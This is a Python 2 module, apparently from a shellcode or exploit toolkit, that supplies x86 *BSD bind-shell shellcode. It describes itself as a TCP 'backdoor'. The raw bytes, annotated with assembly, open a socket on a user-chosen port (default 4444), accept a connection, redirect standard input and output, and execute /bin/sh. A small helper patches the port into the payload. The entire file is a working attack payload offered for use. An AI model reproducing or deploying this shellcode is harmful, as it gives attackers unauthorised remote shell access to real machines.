########################################################################################
# title         : x86_bsd_bindport
# description   : Shellcode for x86 *BSD systems that create a simple backdoor over TCP
# author        : Leo 'cryptobioz' Depriester <leo.depriester@exadot.fr>
# date          : 2016/07/25
# version       : 1.0
########################################################################################
import struct
class Shellcode:
    
    @staticmethod
    def get():
        shellcode = Shellcode.shellcode
        
        # Define port
        port = raw_input("Port [4444] : ")
        if not port:
            port = 4444
        port = struct.pack(">H", port)
        if "\x00" in port:
            print "[-] The hex value of your port number (%s) contains \\x00." % port
            exit(1)
        shellcode = shellcode.replace(b"\x68\xff\x02\x41\x42", b"\x68\xff\x02"+port)
        return shellcode

    shellcode = (
        "\x31\xc0"               # 0x00000000:     xor eax,eax
        "\x50"                   # 0x00000002:     push eax
        "\x68\xff\x02\x41\x42"   # 0x00000003:     push dword 0x424102ff ; port = x04142
        "\x89\xe7"               # 0x00000008:     mov edi,esp
        "\x50"                   # 0x0000000A:     push eax
        "\x6a\x01"               # 0x0000000B:     push byte +0x1
        "\x6a\x02"               # 0x0000000D:     push byte +0x2
        "\x6a\x10"               # 0x0000000F:     push byte +0x10
        "\xb0\x61"               # 0x00000011:     mov al,0x61
        "\xcd\x80"               # 0x00000013:     int 0x80 ; socket()
        "\x57"                   # 0x00000015:     push edi
        "\x50"                   # 0x00000016:     push eax
        "\x50"                   # 0x00000017:     push eax
        "\x6a\x68"               # 0x00000018:     push byte +0x68
        "\x58"                   # 0x0000001A:     pop eax
        "\xcd\x80"               # 0x0000001B:     int 0x80 ; bind()
        "\x89\x47\xec"           # 0x0000001D:     mov [edi-0x14],eax
        "\xb0\x6a"               # 0x00000020:     mov al,0x6a
        "\xcd\x80"               # 0x00000022:     int 0x80 ; listen()
        "\xb0\x1e"               # 0x00000024:     mov al,0x1e
        "\xcd\x80"               # 0x00000026:     int 0x80 ; accept()
        "\x50"                   # 0x00000028:     push eax
        "\x50"                   # 0x00000029:     push eax
        "\x6a\x5a"               # 0x0000002A:     push byte +0x5a
        "\x58"                   # 0x0000002C:     pop eax
        "\xcd\x80"               # 0x0000002D:     int 0x80 ; dup2()
        "\xff\x4f\xe4"           # 0x0000002F:     dec dword [edi-0x1c]
        "\x79\xf6"               # 0x00000032:     jns 0x2a
        "\x50"                   # 0x00000034:     push eax
        "\x68\x2f\x2f\x73\x68"   # 0x00000035:     push dword 0x68732f2f ; //sh
        "\x68\x2f\x62\x69\x6e"   # 0x0000003A:     push dword 0x6e69622f ; /bin
        "\x89\xe3"               # 0x0000003F:     mov ebx,esp
        "\x50"                   # 0x00000041:     push eax
        "\x54"                   # 0x00000042:     push esp
        "\x53"                   # 0x00000043:     push ebx
        "\x50"                   # 0x00000044:     push eax
        "\xb0\x3b"               # 0x00000045:     mov al,0x3b
        "\xcd\x80"               # 0x00000047:     int 0x80 ; execve()
    ) 
